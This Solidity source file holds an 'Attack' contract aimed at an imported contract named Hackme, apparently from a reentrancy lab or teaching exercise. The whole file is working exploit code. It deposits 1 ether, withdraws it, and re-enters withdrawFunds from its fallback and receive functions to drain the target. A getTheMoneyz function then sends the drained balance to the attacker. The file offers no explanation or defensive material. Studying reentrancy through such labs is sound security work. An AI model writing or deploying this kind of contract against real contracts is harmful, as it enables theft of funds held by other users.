// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

import "../src/Vulnerable.sol";

contract Attack {
    
    //pass ether to the contract if you get the revert error
    address owner;
    Hackme public _hackme;
    constructor(address _vulnerable){
        _hackme = Hackme(_vulnerable);
        owner = msg.sender;
     
    }

    function attackVulnerable() public payable{
        require(msg.value >= 1 ether);
        _hackme.depositFunds{value:1 ether}();
  
        assert(_hackme.canIWithdraw(address(this)) > 0);
        _hackme.withdrawFunds(1 ether);
    }
    
    function getBalance()public view returns(uint256){
        //returns the balance in the contract
        return address(this).balance;
    }

    function getTheMoneyz() public {
        //withdraw the funds from the contract
        require(msg.sender == owner);
        payable(owner).transfer(payable(this).balance);
    }

    fallback() external payable { 
       //fallback function
        _hackme.withdrawFunds(1 ether);

    }

    receive() external payable{
       _hackme.withdrawFunds(1 ether);
    }
   
       
}